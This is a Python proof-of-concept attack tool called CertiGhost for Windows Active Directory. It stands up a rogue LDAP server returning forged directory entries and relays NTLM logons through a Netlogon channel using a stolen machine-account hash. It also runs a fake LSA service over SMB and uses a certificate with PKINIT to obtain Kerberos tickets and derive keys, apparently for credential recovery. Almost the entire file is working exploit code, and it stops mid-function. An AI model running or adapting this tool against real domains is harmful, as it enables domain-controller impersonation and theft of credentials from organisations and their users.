#!/usr/bin/env python3
# CertiGhost - cdc-redirect chain PoC
# Authors: @h0j3n, @aniqfakhrul
#
# python3 certighost.py -d <domain> -u <user> -p <pass> --dc-ip <ip>
import argparse, calendar, logging, os, random, secrets, signal
import socket, string, struct, sys, threading, time
from binascii import unhexlify
from datetime import datetime, timedelta, timezone
from pathlib import Path
from random import getrandbits

from impacket import ntlm, smbserver, uuid
from impacket.dcerpc.v5 import epm, lsad, nrpc, rpcrt, samr, transport
from impacket.dcerpc.v5.dtypes import DWORD, LPWSTR, NULL, PBYTE, RPC_SID, ULONG
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.nrpc import checkNullString
from impacket.dcerpc.v5.rpcrt import (
    DCERPCServer, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, TypeSerialization1,
)
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AD_IF_RELEVANT, AP_REQ, AS_REP, TGS_REP, TGS_REQ,
    Authenticator, EncASRepPart, EncTicketPart,
    Ticket as TicketAsn1, seq_set, seq_set_iter,
)
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5.pac import (
    NTLM_SUPPLEMENTAL_CREDENTIAL, PAC_CREDENTIAL_DATA,
    PAC_CREDENTIAL_INFO, PAC_INFO_BUFFER, PACTYPE,
)
from impacket.krb5.types import KerberosTime, Principal, Ticket
from impacket.uuid import uuidtup_to_bin
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa as rsa_mod
from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, pkcs12
from cryptography.x509.oid import NameOID

from asn1crypto import algos as asn1algos, cms as asn1cms, core
from asn1crypto import keys as asn1keys, x509 as asn1x509

from Cryptodome.Cipher import ARC4
from Cryptodome.Hash import MD4

from impacket.ldap import ldap as impacket_ldap
from impacket.ldap.ldapasn1 import Scope


TAG = "explicit"
APPLICATION = 1

DH_P = int(
    "00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea6"
    "3b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e4"
    "85b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b"
    "1fe649286651ece65381ffffffffffffffff", 16)
DH_G = 2


def bin2sid(r):
    rev, n = struct.unpack(">BB", r[:2])
    auth = struct.unpack(">Q", b"\x00\x00" + r[2:8])[0]
    return f"S-{rev}-{auth}-" + "-".join(str(struct.unpack("<I", r[8+i*4:12+i*4])[0]) for i in range(n))

def dns2dn(d): return ",".join(f"DC={p}" for p in d.split("."))
def dns2nb(d): return d.split(".")[0].upper()
def compute_nthash(pw): return MD4.new(pw.encode("utf-16-le")).hexdigest()
def hdigest(data, algo):
    d = hashes.Hash(algo()); d.update(data); return d.finalize()

def _bl(n):
    if n < 0x80: return bytes([n])
    o = b""
    while n: o = bytes([n & 0xFF]) + o; n >>= 8
    return bytes([0x80 | len(o)]) + o

def _bi(n):
    if n == 0: return b"\x02\x01\x00"
    o = b""
    while n: o = bytes([n & 0xFF]) + o; n >>= 8
    if o[0] & 0x80: o = b"\x00" + o
    return b"\x02" + _bl(len(o)) + o

def _bo(d):
    if isinstance(d, str): d = d.encode()
    return b"\x04" + _bl(len(d)) + d

def _bs(i): return b"\x30" + _bl(len(i)) + i
def _bst(i): return b"\x31" + _bl(len(i)) + i
def _be(n): return b"\x0a\x01" + bytes([n])

def _lm(mid, tag, p): return _bs(_bi(mid) + bytes([tag]) + _bl(len(p)) + p)
def _lbr(mid, rc=0, cr=None):
    i = _be(rc) + _bo("") + _bo("")
    if cr: i += b"\x87" + _bl(len(cr)) + cr
    return _lm(mid, 0x61, i)

def _lse(mid, dn, attrs):
    al = b""
    for k, vs in attrs.items():
        ve = b""
        for v in vs: ve += _bo(v if isinstance(v, bytes) else v.encode())
        al += _bs(_bo(k) + _bst(ve))
    return _lm(mid, 0x64, _bo(dn) + _bs(al))

def _lsd(mid, rc=0): return _lm(mid, 0x65, _be(rc) + _bo("") + _bo(""))

def _dl(d, o):
    f = d[o]; o += 1
    if f < 0x80: return f, o
    nb = f & 0x7F; l = 0
    for i in range(nb): l = (l << 8) | d[o + i]
    return l, o + nb

def _plh(d):
    _, o = _dl(d, 1); il, o = _dl(d, o + 1)
    mid = int.from_bytes(d[o:o + il], "big"); o += il
    tag = d[o]; pl, o = _dl(d, o + 1)
    return mid, tag, d[o:o + pl]

def _challenge():
    c = ntlm.NTLMAuthChallenge()
    fl = (ntlm.NTLMSSP_NEGOTIATE_UNICODE | ntlm.NTLM_NEGOTIATE_OEM | ntlm.NTLMSSP_NEGOTIATE_NTLM |
          ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO | ntlm.NTLMSSP_TARGET_TYPE_DOMAIN |
          ntlm.NTLMSSP_NEGOTIATE_VERSION | ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY |
          ntlm.NTLMSSP_REQUEST_TARGET | ntlm.NTLMSSP_NEGOTIATE_56 |
          ntlm.NTLMSSP_NEGOTIATE_128 | ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH)
    return fl, c

def build_challenge(dnb, ddns, hnb, hdns, chal):
    fl, c = _challenge()
    c["flags"] = fl; c["challenge"] = chal
    db = dnb.encode("utf-16-le")
    c["domain_name"] = db; c["domain_len"] = len(db); c["domain_max_len"] = len(db); c["domain_offset"] = 56
    av = ntlm.AV_PAIRS()
    av[ntlm.NTLMSSP_AV_DOMAINNAME] = dnb.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = ddns.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_HOSTNAME] = hnb.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = hdns.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_TIME] = struct.pack("<q", 116444736000000000 + calendar.timegm(time.gmtime()) * 10000000)
    c["TargetInfoFields"] = av; c["TargetInfoFields_len"] = len(av)
    c["TargetInfoFields_max_len"] = len(av); c["TargetInfoFields_offset"] = 56 + len(db)
    c["Version"] = b"\x0a\x00\x00\x00\x00\x00\x00\x0f"; c["VersionLen"] = 8
    return c.getData()

def truncate_key(value, ksz):
    out = b""; n = 0
    while len(out) < ksz:
        cd = hdigest(bytes([n]) + value, hashes.SHA1)
        if len(out) + len(cd) > ksz: out += cd[:ksz - len(out)]; break
        out += cd; n += 1
    return out

def e2i(v):
    if isinstance(v, int): return v
    try: return int(v)
    except: return v.value if hasattr(v, 'value') else int(str(v))

def dns_resolve(hostname, nameserver):
    try:
        import dns.resolver
        r = dns.resolver.Resolver(configure=False)
        r.nameservers = [nameserver]
        r.timeout = 5; r.lifetime = 5
        return str(r.resolve(hostname, "A")[0])
    except: return None

def detect_ip(dc_ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2)
        s.connect((dc_ip, 445)); ip = s.getsockname()[0]; s.close(); return ip
    except: return None

def ldap_connect(dc_ip, domain, username, password, lmhash, nthash, base_dn, use_ldap=False):
    scheme = "ldap" if use_ldap else "ldaps"
    try:
        conn = impacket_ldap.LDAPConnection(f"{scheme}://{dc_ip}", base_dn, dc_ip)
        conn.login(username, password, domain, lmhash, nthash)
        return conn
    except Exception:
        if not use_ldap:
            try:
                conn = impacket_ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn, dc_ip)
                conn.login(username, password, domain, lmhash, nthash)
                return conn
            except Exception:
                pass
    return None

def ldap_query(conn, base, filt, attrs, scope=None):
    sc = scope or Scope('wholeSubtree')
    try: results = conn.search(searchBase=base, searchFilter=filt, attributes=attrs, scope=sc)
    except Exception: return []
    entries = []
    for item in results:
        if not hasattr(item, 'getComponentByName'): continue
        try: item['objectName']
        except: continue
        entry = {}
        for attr in item['attributes']:
            key = str(attr['type'])
            vals = [bytes(v) for v in attr['vals']]
            if len(vals) == 1:
                try: entry[key] = vals[0].decode('utf-8')
                except: entry[key] = vals[0]
            else:
                entry[key] = vals
        entries.append(entry)
    return entries

def ldap_query_one(conn, base, filt, attrs):
    entries = ldap_query(conn, base, filt, attrs)
    return entries[0] if entries else None


class NLOracle:
    def __init__(self, dcip, cname, chash, cdom):
        self.dcip, self.cname, self.chash = dcip, cname, unhexlify(chash)
        self.cdom = cdom; self.name = cname.rstrip("$"); self.dce = self.auth = None

    def setup(self):
        b = epm.hept_map(self.dcip, nrpc.MSRPC_UUID_NRPC,
                         dataRepresentation=rpcrt.DCERPC.NDRSyntax, protocol='ncacn_ip_tcp')
        t = transport.DCERPCTransportFactory(b); d = t.get_dce_rpc(); d.connect()
        syn = uuid.bin_to_uuidtup(rpcrt.DCERPC.NDRSyntax)
        d.bind(nrpc.MSRPC_UUID_NRPC, transfer_syntax=syn)
        cc = os.urandom(8)
        r = nrpc.hNetrServerReqChallenge(d, "", self.name + "\x00", cc)
        sk = nrpc.ComputeSessionKeyStrongKey(None, cc, r["ServerChallenge"], self.chash)
        cr = nrpc.ComputeNetlogonCredential(cc, sk)
        nrpc.hNetrServerAuthenticate3(d, "\x00", self.cname + "\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel,
            self.name + "\x00", cr, 0x600FFFFF)
        d.set_credentials(self.cname, "", self.cdom)
        d.set_auth_type(rpcrt.RPC_C_AUTHN_NETLOGON)
        d.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        d.bind(nrpc.MSRPC_UUID_NRPC, alter=1, transfer_syntax=syn)
        a = nrpc.ComputeNetlogonAuthenticator(cr, sk)
        d.set_session_key(sk)
        resp = nrpc.hNetrLogonGetCapabilities(d, "", self.name, a)
        self.auth = resp['ReturnAuthenticator']; self.dce = d

    def validate(self, blob, challenge):
        am = ntlm.NTLMAuthChallengeResponse(); am.fromString(blob)
        r = nrpc.NetrLogonSamLogonWithFlags()
        r["LogonServer"] = "\x00"; r["ComputerName"] = self.name + "\x00"
        r["ValidationLevel"] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
        r["LogonLevel"] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        r["LogonInformation"]["tag"] = r["LogonLevel"]
        ident = r["LogonInformation"]["LogonNetworkTransitive"]["Identity"]
        ident["LogonDomainName"] = am["domain_name"].decode("utf-16le")
        ident["ParameterControl"] = 2**11
        ident["UserName"] = am["user_name"].decode("utf-16le"); ident["Workstation"] = ""
        r["LogonInformation"]["LogonNetworkTransitive"]["LmChallenge"] = challenge
        r["LogonInformation"]["LogonNetworkTransitive"]["NtChallengeResponse"] = am["ntlm"]
        r["LogonInformation"]["LogonNetworkTransitive"]["LmChallengeResponse"] = am["lanman"]
        r["Authenticator"] = self.auth
        r["ReturnAuthenticator"]["Credential"] = b"\x00"*8
        r["ReturnAuthenticator"]["Timestamp"] = 0; r["ExtraFlags"] = 0
        resp = self.dce.request(r)
        sk = ntlm.generateEncryptedSessionKey(
            resp["ValidationInformation"]["ValidationSam4"]["UserSessionKey"], am["session_key"])
        return sk, resp["ErrorCode"], am["flags"]


def _patch_smb():
    S = smbserver.SimpleSMBServer
    if not hasattr(S, "setComputerAccount"):
        def _sca(self, **kw):
            c = self._SimpleSMBServer__smbConfig
            c.set("global", "server_name", kw["computer_account_name"][:-1])
            c.set("global", "server_domain", kw["computer_account_domain"])
            for k in ("computer_account_name","computer_account_hash","computer_account_aes",
                       "computer_account_password","computer_account_domain"):
                c.set("global", k, kw.get(k, "") or "")
            c.set("global", "dcip", kw["dcip"])
            self._SimpleSMBServer__server.setServerConfig(c)
            self._SimpleSMBServer__server.processConfigFile()
        S.setComputerAccount = lambda self, **kw: _sca(self, **kw)
    if not hasattr(S, "getServer"):
        S.getServer = lambda self: self._SimpleSMBServer__server
_patch_smb()


class LSASrv(DCERPCServer):
    UUID = ("12345778-1234-ABCD-EF00-0123456789AB", "0.0")
    def __init__(self, nb, dns, forest, guid_le, sid_s):
        DCERPCServer.__init__(self)
        self._h = b"\x00"*4 + b"LSA!" + b"\xde\xad\xbe\xef"*2
        self._nb, self._dns, self._forest, self._g, self._sid = nb, dns, forest, guid_le, sid_s
        self.addCallbacks(self.UUID, "\\PIPE\\lsarpc",
            {0:self._cl, 6:self._op, 7:self._q, 44:self._op2, 46:self._q2})
    def _u(self, s): u = lsad.RPC_UNICODE_STRING(); u["Data"] = s; return u
    def _s(self):  s = RPC_SID(); s.fromCanonical(self._sid); return s
    def _di(self):
        i = lsad.LSAPR_POLICY_DNS_DOMAIN_INFO(); i["Name"] = self._u(self._nb)
        i["DnsDomainName"] = self._u(self._dns); i["DnsForestName"] = self._u(self._forest)
        i["DomainGuid"] = self._g; i["Sid"] = self._s(); return i
    def _cl(self, d):
        r = lsad.LsarCloseResponse(); r["PolicyHandle"] = b"\x00"*20; r["ErrorCode"] = 0; return r.getData()
    def _op(self, d):
        r = lsad.LsarOpenPolicyResponse(); r["PolicyHandle"] = self._h; r["ErrorCode"] = 0; return r.getData()
    def _op2(self, d):
        r = lsad.LsarOpenPolicy2Response(); r["PolicyHandle"] = self._h; r["ErrorCode"] = 0; return r.getData()
    def _qd(self, d, cls):
        try: req = lsad.LsarQueryInformationPolicy(d); lv = int(req["InformationClass"])
        except: lv = 12
        r = cls(); info = lsad.LSAPR_POLICY_INFORMATION()
        if lv in (12, 13):
            info["tag"] = lv; info["PolicyDnsDomainInfo" if lv == 12 else "PolicyDnsDomainInfoInt"] = self._di()
        elif lv in (5, 14):
            info["tag"] = lv; ai = lsad.LSAPR_POLICY_ACCOUNT_DOM_INFO()
            ai["DomainName"] = self._u(self._nb); ai["DomainSid"] = self._s()
            info["PolicyAccountDomainInfo" if lv == 5 else "PolicyLocalAccountDomainInfo"] = ai
        elif lv == 3:
            info["tag"] = 3; pi = lsad.LSAPR_POLICY_PRIMARY_DOM_INFO()
            pi["Name"] = self._u(self._nb); pi["Sid"] = self._s(); info["PolicyPrimaryDomainInfo"] = pi
        elif lv == 6:
            info["tag"] = 6; ri = lsad.POLICY_LSA_SERVER_ROLE_INFO(); ri["LsaServerRole"] = 3
            info["PolicyServerRoleInfo"] = ri
        else:
            r["PolicyInformation"] = NULL; r["ErrorCode"] = 0xC0000022; return r.getData()
        r["PolicyInformation"] = info; r["ErrorCode"] = 0; return r.getData()
    def _q(self, d): return self._qd(d, lsad.LsarQueryInformationPolicyResponse)
    def _q2(self, d): return self._qd(d, lsad.LsarQueryInformationPolicy2Response)

def run_lsa(bind, port, nb, dns, forest, guid_le, sid_s, cname, chash, cpass, cdom, dcip):
    smb = smbserver.SimpleSMBServer(listenAddress=bind, listenPort=port)
    smb.setSMB2Support(True); smb.setLogFile("")
    smb.setComputerAccount(computer_account_name=cname, computer_account_hash=chash,
        computer_account_aes="", computer_account_password=cpass,
        computer_account_domain=cdom, dcip=dcip)
    cfg = smb._SimpleSMBServer__smbConfig
    cfg.set("global", "server_os", "Windows Server 2022 Standard")
    smb.getServer().setServerConfig(cfg); smb.getServer().processConfigFile()
    lsa = LSASrv(nb, dns, forest, guid_le, sid_s); lsa.daemon = True; lsa.start()
    smb.registerNamedPipe("lsarpc", ("127.0.0.1", lsa.getListenPort()))
    smb.start()


class ConnState:
    def __init__(self):
        self.fl = 0; self.ss = self.ce = self.se = None
        self.sseq = 0; self.sealed = False; self.chal = b""
    def arm(self, sk, fl):
        self.fl = fl
        self.ss = ntlm.SIGNKEY(fl, sk, "Server")
        self.ce = ARC4.new(ntlm.SEALKEY(fl, sk, "Client"))
        self.se = ARC4.new(ntlm.SEALKEY(fl, sk, "Server")); self.sealed = True

class RogueLDAP:
    def __init__(self, ddns, dnb, cname, chash, cdom, dcip, tsid_bin, edns, ecn, esam):
        self.ddns, self.dnb, self.dn = ddns, dnb, dns2dn(ddns)
        self.cname, self.chash, self.cdom, self.dcip = cname, chash, cdom, dcip
        self.tsid, self.edns, self.ecn, self.esam = tsid_bin, edns, ecn, esam
        self._hnb = cname.rstrip("$"); self._hdns = f"{self._hnb}.{ddns}"

    def _rootdse(self):
        return {"defaultNamingContext":[self.dn], "rootDomainNamingContext":[self.dn],
                "configurationNamingContext":[f"CN=Configuration,{self.dn}"],
                "schemaNamingContext":[f"CN=Schema,CN=Configuration,{self.dn}"],
                "namingContexts":[self.dn, f"CN=Configuration,{self.dn}",
                                  f"CN=Schema,CN=Configuration,{self.dn}"],
                "dnsHostName":[self._hdns],
                "ldapServiceName":[f"{self.ddns}:{self._hnb.lower()}$@{self.ddns.upper()}"],
                "supportedSASLMechanisms":["GSSAPI","GSS-SPNEGO","EXTERNAL","DIGEST-MD5"],
                "supportedLDAPVersion":["3","2"],
                "supportedCapabilities":["1.2.840.113556.1.4.800","1.2.840.113556.1.4.1670",
                                          "1.2.840.113556.1.4.1791","1.2.840.113556.1.4.1935"],
                "domainFunctionality":["7"],"forestFunctionality":["7"],
                "domainControllerFunctionality":["7"]}

    def _principal(self, sam):
        return {"objectClass":["top","person","organizationalPerson","user","computer"],
                "cn":[self.ecn or sam.rstrip("$")], "sAMAccountName":[self.esam or sam],
                "objectSid":[self.tsid], "objectGUID":[b"\x00"*16], "userAccountControl":["66048"],
                "objectCategory":[f"CN=Computer,CN=Schema,CN=Configuration,{self.dn}"],
                "dNSHostName":[self.edns],
                "servicePrincipalName":[f"HOST/{self.edns}", f"HOST/{self.ecn or self._hnb}"]}

    def _seal(self, st, pdu):
        sealed, sig = ntlm.SEAL(st.fl, st.ss, b"", pdu, pdu, st.sseq, st.se.encrypt)
        st.sseq += 1; f = sig.getData() + sealed
        return struct.pack(">I", len(f)) + f

    def _send(self, conn, st, data, do_seal):
        if do_seal and st.sealed: conn.send(self._seal(st, data))
        else: conn.send(data)

    def _handle_bind(self, conn, st, mid, od, rs):
        off = 0
        if od[off] != 0x02: return
        vl, off = _dl(od, off + 1); off += vl; off += 1
        nl2, off = _dl(od, off); off += nl2
        at = od[off]
        if at == 0xa3:
            off += 1; sl, off = _dl(od, off)
            if od[off] != 0x04: return
            ml, off = _dl(od, off + 1); mech = od[off:off+ml].decode("utf-8", errors="replace"); off += ml
            creds = b""
            if off < len(od) and od[off] == 0x04:
                cl, off = _dl(od, off + 1); creds = od[off:off+cl]
            if mech in ("GSS-SPNEGO","GSSAPI") and creds.startswith(b"NTLMSSP\x00") and len(creds) >= 12:
                mt = int.from_bytes(creds[8:12], "little")
                if mt == 1:
                    st.chal = os.urandom(8)
                    ch = build_challenge(self.dnb, self.ddns, self._hnb, self._hdns, st.chal)
                    self._send(conn, st, _lbr(mid, 14, ch), rs); return
                if mt == 3:
                    nlo = NLOracle(self.dcip, self.cname, self.chash, self.cdom)
                    try: nlo.setup(); sk, err, fl = nlo.validate(creds, st.chal)
                    except Exception:
                        self._send(conn, st, _lbr(mid, 49), rs); return
                    if err != 0:
                        self._send(conn, st, _lbr(mid, 49), rs); return
                    st.arm(sk, fl)
                    self._send(conn, st, _lbr(mid, 0), rs); return
        self._send(conn, st, _lbr(mid, 0), rs)

    def _handle_search(self, conn, st, mid, od, rs):
        off = 0
        if od[off] != 0x04: return
        dl2, off = _dl(od, off + 1); bdn = od[off:off+dl2].decode("utf-8", errors="replace")
        if bdn == "":
            self._send(conn, st, _lse(mid, "", self._rootdse()), rs)
            self._send(conn, st, _lsd(mid, 0), rs); return
        sam = self.esam or "X$"
        fr = bdn.split(",")[0]
        if "=" in fr:
            cv = fr.split("=", 1)[1]
            sam = cv if cv.endswith("$") else cv + "$"
        self._send(conn, st, _lse(mid, bdn, self._principal(sam)), rs)
        self._send(conn, st, _lsd(mid, 0), rs)

    def _dispatch(self, conn, st, msg, rs):
        mid, tag, od = _plh(msg)
        if tag == 0x60: self._handle_bind(conn, st, mid, od, rs)
        elif tag == 0x63: self._handle_search(conn, st, mid, od, rs)

    def _client(self, conn):
        conn.settimeout(30); st = ConnState(); buf = b""
        try:
            while True:
                chunk = conn.recv(8192)
                if not chunk: break
                buf += chunk
                while buf:
                    if not st.sealed:
                        if not buf or buf[0] != 0x30 or len(buf) < 2: break
                        sl, o = _dl(buf, 1); total = o + sl
                        if len(buf) < total: break
                        self._dispatch(conn, st, buf[:total], False); buf = buf[total:]
                    else:
                        if len(buf) < 4: break
                        fl = struct.unpack(">I", buf[:4])[0]
                        if len(buf) < 4 + fl: break
                        framed = buf[4:4+fl]; buf = buf[4+fl:]
                        plain = st.ce.encrypt(framed[16:])
                        p = 0
                        while p < len(plain):
                            if plain[p] != 0x30: break
                            sl2, so = _dl(plain, p + 1); t = so + sl2
                            if p + t > len(plain): break
                            self._dispatch(conn, st, plain[p:p+t], True); p += t
        except: pass
        finally:
            try: conn.close()
            except: pass

    def serve(self, bind="0.0.0.0", port=389):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((bind, port)); s.listen(8)
        while True:
            conn, _ = s.accept()
            threading.Thread(target=self._client, args=(conn,), daemon=True).start()


class _NameType:
    PRINCIPAL = 1; SRV_INST = 2

class _SeqGS(core.SequenceOf):
    _child_spec = core.GeneralString

class _PrincipalName(core.Sequence):
    _fields = [("name-type", core.Integer, {"tag_type": TAG, "tag": 0}),
               ("name-string", _SeqGS, {"tag_type": TAG, "tag": 1})]

class _EncType:
    AES256 = 18; AES128 = 17

class _KDCOpts(core.BitString):
    _map = {1:"forwardable", 8:"renewable", 27:"renewable-ok"}

class _EncData(core.Sequence):
    _fields = [("etype", core.Integer, {"tag_type":TAG,"tag":0}),
               ("kvno", core.Integer, {"tag_type":TAG,"tag":1,"optional":True}),
               ("cipher", core.OctetString, {"tag_type":TAG,"tag":2})]

class _Ticket(core.Sequence):
    explicit = (APPLICATION, 1)
    _fields = [("tkt-vno", core.Integer, {"tag_type":TAG,"tag":0}),
               ("realm", core.GeneralString, {"tag_type":TAG,"tag":1}),
               ("sname", _PrincipalName, {"tag_type":TAG,"tag":2}),
               ("enc-part", _EncData, {"tag_type":TAG,"tag":3})]

class _SeqTicket(core.SequenceOf): _child_spec = _Ticket
class _SeqEnc(core.SequenceOf): _child_spec = core.Integer

class _PaData(core.Sequence):
    _fields = [("padata-type", core.Integer, {"tag_type":TAG,"tag":1}),
               ("padata-value", core.OctetString, {"tag_type":TAG,"tag":2})]

class _MethodData(core.SequenceOf): _child_spec = _PaData

class _KdcReqBody(core.Sequence):
    _fields = [("kdc-options", _KDCOpts, {"tag_type":TAG,"tag":0}),
               ("cname", _PrincipalName, {"tag_type":TAG,"tag":1,"optional":True}),
               ("realm", core.GeneralString, {"tag_type":TAG,"tag":2}),
               ("sname", _PrincipalName, {"tag_type":TAG,"tag":3,"optional":True}),
               ("till", core.GeneralizedTime, {"tag_type":TAG,"tag":5,"optional":True}),
               ("rtime", core.GeneralizedTime, {"tag_type":TAG,"tag":6,"optional":True}),
               ("nonce", core.Integer, {"tag_type":TAG,"tag":7}),
               ("etype", _SeqEnc, {"tag_type":TAG,"tag":8}),
               ("additional-tickets", _SeqTicket, {"tag_type":TAG,"tag":11,"optional":True})]

class _KdcReq(core.Sequence):
    _fields = [("pvno", core.Integer, {"tag_type":TAG,"tag":1}),
               ("msg-type", core.Integer, {"tag_type":TAG,"tag":2}),
               ("padata", _MethodData, {"tag_type":TAG,"tag":3,"optional":True}),
               ("req-body", _KdcReqBody, {"tag_type":TAG,"tag":4})]

class _AsReq(_KdcReq):
    explicit = (APPLICATION, 10)

class _PaPacReq(core.Sequence):
    _fields = [("include-pac", core.Boolean, {"tag_type":TAG,"tag":0})]

class _PKAuth(core.Sequence):
    _fields = [("cusec", core.Integer, {"tag_type":"explicit","tag":0}),
               ("ctime", core.GeneralizedTime, {"tag_type":"explicit","tag":1}),
               ("nonce", core.Integer, {"tag_type":"explicit","tag":2}),
               ("paChecksum", core.OctetString, {"tag_type":"explicit","tag":3,"optional":True})]

class _AuthPack(core.Sequence):
    _fields = [("pkAuthenticator", _PKAuth, {"tag_type":"explicit","tag":0}),
               ("clientPublicValue", asn1keys.PublicKeyInfo, {"tag_type":"explicit","tag":1,"optional":True}),
               ("clientDHNonce", core.OctetString, {"tag_type":"explicit","tag":3,"optional":True})]

class _PaPkAsReq(core.Sequence):
    _fields = [("signedAuthPack", core.OctetString, {"tag_type":"implicit","tag":0})]

class _DHRepInfo(core.Sequence):
    _fields = [("dhSignedData", core.OctetString, {"tag_type":"implicit","tag":0}),
               ("serverDHNonce", core.OctetString, {"tag_type":"explicit","tag":1,"optional":True})]

class _PaPkAsRep(core.Choice):
    _alternatives = [("dhInfo", _DHRepInfo, {"explicit":(2,0)}),
                     ("encKeyPack", core.OctetString, {"implicit":(2,1)})]

class _KDCDHKeyInfo(core.Sequence):
    _fields = [("subjectPublicKey", core.BitString, {"tag_type":"explicit","tag":0}),
               ("nonce", core.Integer, {"tag_type":"explicit","tag":1})]


PKINIT_OID = "1.3.6.1.5.2.3.1"
CMS_SD_OID = "1.2.840.113549.1.7.2"
DH_KA_OID = "1.2.840.10046.2.1"

class DirtyDH:
    def __init__(self):
        self.p, self.g = DH_P, DH_G
        self.priv = os.urandom(32); self.priv_int = int.from_bytes(self.priv, "big")
        self.nonce = os.urandom(32)
    def pub(self): return pow(self.g, self.priv_int, self.p)
    def exchange(self, peer):
        sk = pow(peer, self.priv_int, self.p); h = hex(sk)[2:]
        if len(h) % 2: h = "0" + h
        return bytes.fromhex(h)

def sign_authpack(data, key, cert_der):
    cert_a = asn1x509.Certificate.load(cert_der)
    da = {"algorithm": asn1algos.DigestAlgorithmId("sha1")}
    si = {"version":"v1",
          "sid": asn1cms.IssuerAndSerialNumber({"issuer":cert_a.issuer,"serial_number":cert_a.serial_number}),
          "digest_algorithm": asn1algos.DigestAlgorithm(da),
          "signed_attrs": [asn1cms.CMSAttribute({"type":"content_type","values":[PKINIT_OID]}),
                           asn1cms.CMSAttribute({"type":"message_digest","values":[hdigest(data, hashes.SHA1)]})],
          "signature_algorithm": asn1algos.SignedDigestAlgorithm({"algorithm":"sha1_rsa"}),
          "signature": b""}
    si["signature"] = key.sign(asn1cms.CMSAttributes(si["signed_attrs"]).dump(),
                               padding.PKCS1v15(), hashes.SHA1())
    sd = {"version":"v3", "digest_algorithms":[asn1algos.DigestAlgorithm(da)],
          "encap_content_info": asn1cms.EncapsulatedContentInfo({"content_type":PKINIT_OID,"content":data}),
          "certificates":[cert_a],
          "signer_infos": asn1cms.SignerInfos([asn1cms.SignerInfo(si)])}
    return asn1cms.ContentInfo({"content_type":CMS_SD_OID,"content":asn1cms.SignedData(sd)}).dump()

def build_pkinit_asreq(username, domain, key, cert_der):
    now = datetime.now(timezone.utc)
    body = {"kdc-options": _KDCOpts({"forwardable","renewable","renewable-ok"}),
            "cname": _PrincipalName({"name-type":_NameType.PRINCIPAL,"name-string":[username]}),
            "realm": domain.upper(),
            "sname": _PrincipalName({"name-type":_NameType.SRV_INST,"name-string":["krbtgt",domain.upper()]}),
            "till": (now + timedelta(days=1)).replace(microsecond=0),
            "rtime": (now + timedelta(days=1)).replace(microsecond=0),
            "nonce": getrandbits(31), "etype":[_EncType.AES256, _EncType.AES128]}
    kb = _KdcReqBody(body); cksum = hdigest(kb.dump(), hashes.SHA1)
    auth = {"cusec":now.microsecond,"ctime":now.replace(microsecond=0),"nonce":getrandbits(31),"paChecksum":cksum}
    dh = DirtyDH()
    dhp = {"p":dh.p,"g":dh.g,"q":0}
    pka = {"algorithm":asn1keys.PublicKeyAlgorithm({"algorithm":DH_KA_OID,
            "parameters":asn1keys.DomainParameters(dhp)}),"public_key":dh.pub()}
    ap = _AuthPack({"pkAuthenticator":_PKAuth(auth),
                    "clientPublicValue":asn1keys.PublicKeyInfo(pka),"clientDHNonce":dh.nonce})
    signed = sign_authpack(ap.dump(), key, cert_der)
    pa_pk = _PaPkAsReq(); pa_pk["signedAuthPack"] = signed
    pa_pac = {"padata-type":e2i(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST),
              "padata-value":_PaPacReq({"include-pac":True}).dump()}
    pa_pki = {"padata-type":e2i(constants.PreAuthenticationDataTypes.PA_PK_AS_REQ),
              "padata-value":pa_pk.dump()}
    asreq = {"pvno":5,"msg-type":10,"padata":[pa_pac,pa_pki],"req-body":kb}
    return _AsReq(asreq).dump(), dh


def pkinit_and_hash(pfx_data, username, domain, dc_ip):
    key, cert, _ = pkcs12.load_key_and_certificates(pfx_data, None)
    cert_der = cert.public_bytes(Encoding.DER)
    as_req, dh = build_pkinit_asreq(username, domain, key, cert_der)
    tgt = sendReceive(as_req, domain, dc_ip)
    as_rep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    for pa in as_rep["padata"]:
        if pa["padata-type"] == 17:
            pk_rep = _PaPkAsRep.load(bytes(pa["padata-value"])).native; break
    else:
        raise RuntimeError("PA_PK_AS_REP not in AS_REP")
    ci = asn1cms.ContentInfo.load(pk_rep["dhSignedData"]).native
    ki = ci["content"]["encap_content_info"]
    ad = _KDCDHKeyInfo.load(ki["content"]).native
    pub = int.from_bytes(core.BitString(ad["subjectPublicKey"]).dump()[7:], "big", signed=False)
    shared = dh.exchange(pub); sn = pk_rep["serverDHNonce"]
    full = shared + dh.nonce + sn
    etype = as_rep["enc-part"]["etype"]; cipher = _enctype_table[etype]
    t_key = truncate_key(full, 32 if etype == _EncType.AES256 else 16)
    k = Key(cipher.enctype, t_key)
    dec = cipher.decrypt(k, 3, as_rep["enc-part"]["cipher"])
